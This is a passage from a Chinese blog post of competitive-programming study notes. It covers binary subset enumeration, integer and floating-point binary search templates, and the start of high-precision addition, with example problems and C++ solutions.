href="https://blog.csdn.net/sugarbliss/article/details/81099340">详细介绍二进制枚举</a></p><p>1.含有N个元素的集合的一切子集个数有2^n种，二进制采用0和1来表示数字。于是我们可以利用二进制特性，将含n个元素都用0和1来表示选和不选，于是就可以得到每一种子集的情况。</p><p>2.那我们如何找到每个位置是否选和不选？可以采用位运算和与运算结合的方式。&lt;&lt;运算相当于在01串的尾巴处加上0（左移一位相当于乘以2），而与运算的规则是全为1才可以得到1。那么我们就可以通过对1不断进行左移运算和与运算得到每个位置的选择情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">1</span>=<span class="hljs-number">2</span>(<span class="hljs-number">10</span>);  <span class="hljs-number">1000</span>&amp;<span class="hljs-number">0010</span>=<span class="hljs-number">0000</span><br><br><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">2</span>=<span class="hljs-number">4</span>(<span class="hljs-number">100</span>); <span class="hljs-number">1000</span>&amp;<span class="hljs-number">0100</span>=<span class="hljs-number">0000</span><br><br><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">3</span>=<span class="hljs-number">8</span>(<span class="hljs-number">1000</span>); <span class="hljs-number">1000</span>&amp;<span class="hljs-number">1000</span>=<span class="hljs-number">1000</span><br><br><span class="hljs-attribute">1</span>&lt;&lt;<span class="hljs-number">4</span>=<span class="hljs-number">16</span>(<span class="hljs-number">10000</span>); <span class="hljs-number">01000</span>&amp;<span class="hljs-number">10000</span>=<span class="hljs-number">00000</span><br></code></pre></td></tr></table></figure><p>例题：</p><h3 id="和为K–二进制枚举"><a href="#和为K–二进制枚举" class="headerlink" title="和为K–二进制枚举"></a>和为K–二进制枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 题目">Description<br>给出长度为n的数组,求能否从中选出若干个,使他们的和为K.如果可以,输出:Yes,否则输出No<br>Input<br>第一行：输入N,K,为数组的长度和需要判断的和(2&lt;=N&lt;=20,1&lt;=K&lt;=10^9)<br>第二行：N个值，表示数组中元素的值(1&lt;=a[i]&lt;=10^6)<br>Output<br>输出Yes或No<br>Sample Input<br>5 13<br>2 4 6 8 10<br>Sample Output<br>No<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;k)<br>    &#123;<br>        <span class="hljs-type">int</span> a[n];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>        <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;n);i++)<span class="hljs-comment">//共有1&lt;&lt;n种子集，遍历每种子集</span><br>        &#123;<br>            <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<span class="hljs-comment">//遍历每个位置</span><br>            &#123;<br>                <span class="hljs-keyword">if</span>(i&amp;(<span class="hljs-number">1</span>&lt;&lt;j))  sum+=a[j];<span class="hljs-comment">//如果选择该位置，就加上该位置的值</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(sum==k)&#123;<br>                cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>                flag=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag) cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>     &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="陈老师加油-二进制枚举"><a href="#陈老师加油-二进制枚举" class="headerlink" title="陈老师加油-二进制枚举"></a>陈老师加油-二进制枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 题目">Description<br>陈老师经常开车在哈尔滨的大街上行走，假设刚开始油箱里有T升汽油，每看见加油站陈老师就要把汽油的总量翻倍（就是乘2）；每看见十字路口气油就要减少1升；最后的时候陈老师的车开到一个十字路口，然后车就没油了------就熄火了，陈老师好痛苦啊~~~！<br>然后他就开始回忆，一路上一共遇到5个加油站，10个十字路口，问造成这种惨烈的境遇有多少种可能？<br><br>Input<br>输入一个T ，（1&lt;=T&lt;=100）;<br>Output<br>输出可能的方案数。<br>Sample Input<br>1<br>Sample Output<br>10<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>    &#123;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">15</span>);i++)<span class="hljs-comment">//遍历每种情况</span><br>        &#123;<br>            <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>,b=<span class="hljs-number">0</span>,tmp=n;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">15</span>;j++)<br>            &#123;<br>              <span class="hljs-keyword">if</span>(i&amp;(<span class="hljs-number">1</span>&lt;&lt;j))&#123;<span class="hljs-comment">//可以假设选取该位置为加油站</span><br>                  tmp*=<span class="hljs-number">2</span>;<br>                  a++;<br>              &#125;<br>              <span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//不选取该位置为十字路口</span><br>                  tmp-=<span class="hljs-number">1</span>;<br>                  b++;<br>              &#125;<br>              <span class="hljs-keyword">if</span>(tmp&lt;=<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(tmp==<span class="hljs-number">0</span>&amp;&amp;a==<span class="hljs-number">5</span>&amp;&amp;b==<span class="hljs-number">10</span>) ans++;<span class="hljs-comment">//满足题目条件的情况就加上1</span><br>        &#125;<br>        cout&lt;&lt;ans&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="权利指数"><a href="#权利指数" class="headerlink" title="权利指数"></a>权利指数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 题目">Description<br>在选举问题中，总共有n个小团体，每个小团体拥有一定数量的选票数。如果其中m个小团体的票数和超过总票数的一半，则此组合为“获胜联盟”。n个团体可形成若干个获胜联盟。一个小团体要成为一个“关键加入者”的条件是：在其所在的获胜联盟中，如果缺少了这个小团体的加入，则此联盟不能成为获胜联盟。一个小团体的权利指数是指：一个小团体在所有获胜联盟中成为“关键加入者”的次数。请你计算每个小团体的权利指数。<br>Input<br>输入数据的第一行为一个正整数T，表示有T组测试数据。每一组测试数据的第一行为一个正整数n（0&lt;n&lt;=20）。第二行有n个正整数，分别表示1到n号小团体的票数。<br>Output<br>对每组测试数据，在同一个行按顺序输出1到n号小团体的权利指数。<br>Sample Input<br>2<br>1<br>10<br>7<br>5 7 4 8 6 7 5<br>Sample Output<br>1<br>16 22 16 24 20 22 16<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> k;<br>    cin&gt;&gt;k;<br>    <span class="hljs-keyword">while</span>(k--)<br>    &#123;<br>        <span class="hljs-type">int</span> x,a[<span class="hljs-number">20</span>],sum=<span class="hljs-number">0</span>,flag[<span class="hljs-number">20</span>],b[<span class="hljs-number">20</span>],ans;<span class="hljs-comment">//注意总数再每组数据时要清零，我就栽在这非常久</span><br>        cin&gt;&gt;x;<br>        <span class="hljs-built_in">memset</span>(b,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(b));<span class="hljs-comment">//memset下保证上次数据不会影响</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x;i++)&#123;<br>            cin&gt;&gt;a[i];<br>            sum+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;x);i++)<br>        &#123;<br>            <span class="hljs-built_in">memset</span>(flag,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(flag));<span class="hljs-comment">//这里是关键，用flag记录每种子集选取了哪些位置，以便下面查找情况</span><br>            ans=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;x;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i&amp;(<span class="hljs-number">1</span>&lt;&lt;j))<br>                &#123; ans+=a[j];flag[j]=<span class="hljs-number">1</span>;&#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(ans&lt;=sum/<span class="hljs-number">2</span>)&#123;<span class="hljs-comment">//满足题目条件，找本来不满足，多了一个位置后就可以满足的情况。</span><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> z=<span class="hljs-number">0</span>;z&lt;x;z++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(flag[z]==<span class="hljs-number">0</span>&amp;&amp;ans+a[z]&gt;sum/<span class="hljs-number">2</span>) b[z]++;<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">/*if(ans&gt;=sum/2)&#123;//我原本是顺着题目意思写的，但这里我还不清楚为啥这样写oj过不去</span><br><span class="hljs-comment">                for(int z=0;z&lt;x;z++)</span><br><span class="hljs-comment">                &#123;</span><br><span class="hljs-comment">                    if(flag[z]==1&amp;&amp;ans-a[z]&lt;sum/2) b[z]++;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;*/</span><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x<span class="hljs-number">-1</span>;i++) cout&lt;&lt;b[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        cout&lt;&lt;b[x<span class="hljs-number">-1</span>]&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二分"><a href="#二分" class="headerlink" title="二分"></a>二分</h1><h2 id="整数二分"><a href="#整数二分" class="headerlink" title="整数二分"></a>整数二分</h2><p>二分模板1:（求下标最小的x）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(l&lt;r)<br>&#123;<br>   <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">if</span>(a[mid]&gt;=x) r=mid;<br>   <span class="hljs-keyword">else</span> l=mid+<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//l的范围时[l,mid],r的范围时(mid,r]</span><br><span class="hljs-comment">//当l+r&gt;&gt;1时是向下取整，所以不用担心死循环</span><br></code></pre></td></tr></table></figure><p>二分模板2：（求下标最大的x）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(l&lt;r)<br>&#123;<br>   <span class="hljs-type">int</span> mid=l+r+<span class="hljs-number">1</span>&gt;&gt;<span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">if</span>(a[mid]&lt;=x) l=mid;<br>   <span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//l的范围时[l,mid),r的范围时[mid,r]</span><br><span class="hljs-comment">//当mid=l+r+1&gt;&gt;1 因为在特殊条件下有可能死循环，当只有两个数，且正好按要求排序了的时候，如果选l+r&gt;&gt;1，因为会向下取整导致死循环</span><br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs subunit">789 数的范围<br><br>给定一个按照升序排列的长度为 n 的整数数组，以及 q 个查询。<br><br>对于每个查询，返回一个元素 k 的起始位置和终止位置（位置从 0 开始计数）。<br><br>如果数组中不存在该元素，则返回 <span class="hljs-string">-1</span> <span class="hljs-string">-1</span>。<br><br>输入格式<br>第一行包含整数 n 和 q，表示数组长度和询问个数。<br><br>第二行包含 n 个整数（均在 1∼10000 范围内），表示完整数组。<br><br>接下来 q 行，每行包含一个整数 k，表示一个询问元素。<br><br>输出格式<br>共 q 行，每行包含两个整数，表示所求元素的起始位置和终止位置。<br><br>如果数组中不存在该元素，则返回 <span class="hljs-string">-1</span> <span class="hljs-string">-1</span>。<br><br>数据范围<br>1≤n≤100000<br>1≤q≤10000<br>1≤k≤10000<br>输入样例：<br>6 3<br>1 2 2 3 3 4<br>3<br>4<br>5<br>输出样例：<br>3 4<br>5 5<br><span class="hljs-string">-1</span> <span class="hljs-string">-1</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> q[N],n,m;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;q[i]);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> k;<br>        cin&gt;&gt;k;<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=n<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)&#123;<br>            <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(q[mid]&gt;=k) r=mid;<span class="hljs-comment">//找最早出现的k，那么k后的数都满足大于等于k</span><br>            <span class="hljs-keyword">else</span> l=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(q[l]!=k) cout&lt;&lt;<span class="hljs-string">&quot;-1 -1&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> <br>        &#123;<br>            cout&lt;&lt;l&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=n<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">while</span>(l&lt;r)&#123;<br>                <span class="hljs-type">int</span> mid=l+r+<span class="hljs-number">1</span>&gt;&gt;<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span>(q[mid]&lt;=k) l=mid;<span class="hljs-comment">//找最后出现的k,那么k前面的数都满足小于等于k</span><br>                <span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>;<br>            &#125;<br>            cout&lt;&lt;l&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="浮点数二分"><a href="#浮点数二分" class="headerlink" title="浮点数二分"></a>浮点数二分</h2><p>模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(r-l&gt;<span class="hljs-number">1e-6</span>)<br>&#123;<br>  mid=(l+r)/<span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid)) r=mid;<br>  <span class="hljs-keyword">else</span> l=mid;<br>&#125;<br><span class="hljs-comment">//当r-l&lt;1e-8的时候，r和l的值可以近似认为是答案</span><br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个浮点数 <span class="hljs-built_in">n</span>，求它的三次方根。<br><br>输入格式<br>共一行，包含一个浮点数 <span class="hljs-built_in">n</span>。<br><br>输出格式<br>共一行，包含一个浮点数，表示问题的解。<br><br>注意，结果保留 <span class="hljs-number">6</span> 位小数。<br><br>数据范围<br>−<span class="hljs-number">10000</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">10000</span><br>输入样例：<br><span class="hljs-number">1000.00</span><br>输出样例：<br><span class="hljs-number">10.000000</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">double</span> x;<br>    cin&gt;&gt;x;<br>    <span class="hljs-type">double</span> l=<span class="hljs-number">-10000</span>,r=<span class="hljs-number">10000</span>;<br>    <span class="hljs-keyword">while</span>(r-l&gt;<span class="hljs-number">1e-8</span>)<br>    &#123;<br>        <span class="hljs-type">double</span> mid=(l+r)/<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>((mid*mid*mid)&gt;=x) r=mid;<br>        <span class="hljs-keyword">else</span> l=mid;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.6lf&quot;</span>,l);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="高精度"><a href="#高精度" class="headerlink" title="高精度"></a>高精度</h1><h2 id="高精度加法"><a href="#高精度加法" class="headerlink" title="高精度加法"></a>高精度加法</h2><p>高精度加法关键在于将每一位数字拆解，然后逆向存入数组里（比如输入进来1234，在传入数组中的时候值为4321，然后再利用小学数学加法的知识，每一位数字的值为A[I]+B[I]+t(t为进位的值)，循环进行直到遍历到数组a和b的结束位置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs">给定两个正整数（不含前导 0），计算它们的和。<br><br>输入格式<br>共两行，每行包含一个整数。<br><br>输出格式<br>共一行，包含所求的和。<br><br>数据范围<br>1≤整数长度≤100000<br>输入样例：<br>12<br>23<br>输出样例：<br>35<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;B)</span><span class="hljs-comment">//为啥是传入指针，因为数组A和B的内存过大，如果传入形参会导致内存溢出</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<span class="hljs-comment">//进位</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>()||i&lt;B.<span class="hljs-built_in">size</span>();i++)<span class="hljs-comment">//遍历到数组A或数组B结束位置</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(i&lt;A.<span class="hljs-built_in">size</span>()) t+=A[i];<span class="hljs-comment">//如果没到A结束位置就加上该位置的值</span><br>        <span class="hljs-keyword">if</span>(i&lt;B.<span class="hljs-built_in">size</span>()) t+=B[i];<br>        C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<span class="hljs-comment">//传入未进位的部分，比如t=18,在算数中，1进位，然后7传入</span><br>        t/=<span class="hljs-number">10</span>;<span class="hljs-comment">//记录下进位的数</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(t) C.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string a,b;<span 